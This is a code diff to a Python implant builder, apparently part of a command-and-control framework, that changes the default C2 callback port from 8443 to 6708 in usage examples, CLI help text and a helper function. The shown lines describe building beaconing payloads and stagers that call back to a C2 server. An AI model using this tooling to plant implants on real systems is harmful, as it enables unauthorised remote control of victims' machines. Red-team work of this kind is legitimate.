@@ -10,7 +10,7 @@ Template token format
 ---------------------
 Templates embed plain-string tokens that the builder replaces at build time:
 
-    URSA_C2_URL     → C2 server URL,  e.g. "http://10.0.0.1:8443"
+    URSA_C2_URL     → C2 server URL,  e.g. "http://10.0.0.1:6708"
     URSA_INTERVAL   → beacon interval seconds,  e.g. "5"
     URSA_JITTER     → jitter factor 0.0-1.0,    e.g. "0.1"
 
@@ -41,22 +41,22 @@ Usage (CLI)
     python -m implants.builder list
 
     # Build Python payload to stdout
-    python -m implants.builder build --c2 http://10.0.0.1:8443
+    python -m implants.builder build --c2 http://10.0.0.1:6708
 
     # Build Zig payload and compile it
     python -m implants.builder build --template http_zig \\
-        --c2 http://10.0.0.1:8443 --output /tmp/agent.zig \\
+        --c2 http://10.0.0.1:6708 --output /tmp/agent.zig \\
         --post-build "zig build-exe {output} -femit-bin={binary}"
 
     # Build configured stager
-    python -m implants.builder stager --c2 http://10.0.0.1:8443
+    python -m implants.builder stager --c2 http://10.0.0.1:6708
 
 Usage (Python API)
 ------------------
     from implants.builder import Builder, PayloadConfig
 
     cfg = PayloadConfig(
-        c2_url="http://10.0.0.1:8443",
+        c2_url="http://10.0.0.1:6708",
         template="http_zig",
         post_build="zig build-exe {output} -femit-bin={binary}",
     )
@@ -263,7 +263,7 @@ def detect_local_ip() -> str:
         return "127.0.0.1"
 
 
-def auto_c2_url(port: int = 8443) -> str:
+def auto_c2_url(port: int = 6708) -> str:
     """Build a C2 URL from the auto-detected local IP."""
     return f"http://{detect_local_ip()}:{port}"
 
@@ -285,13 +285,13 @@ def main(argv: list[str] | None = None) -> None:
         epilog=(
             "Examples:\n"
             "  python -m implants.builder list\n"
-            "  python -m implants.builder build --c2 http://10.0.0.1:8443\n"
+            "  python -m implants.builder build --c2 http://10.0.0.1:6708\n"
             "  python -m implants.builder build --template http_python "
-            "--c2 http://10.0.0.1:8443 -o payload.py\n"
+            "--c2 http://10.0.0.1:6708 -o payload.py\n"
             "  python -m implants.builder build --template http_zig "
-            "--c2 http://10.0.0.1:8443 -o /tmp/agent.zig "
+            "--c2 http://10.0.0.1:6708 -o /tmp/agent.zig "
             "--post-build 'zig build-exe {output} -femit-bin={binary}'\n"
-            "  python -m implants.builder stager --c2 http://10.0.0.1:8443\n"
+            "  python -m implants.builder stager --c2 http://10.0.0.1:6708\n"
         ),
     )
     sub = parser.add_subparsers(dest="cmd", metavar="COMMAND")
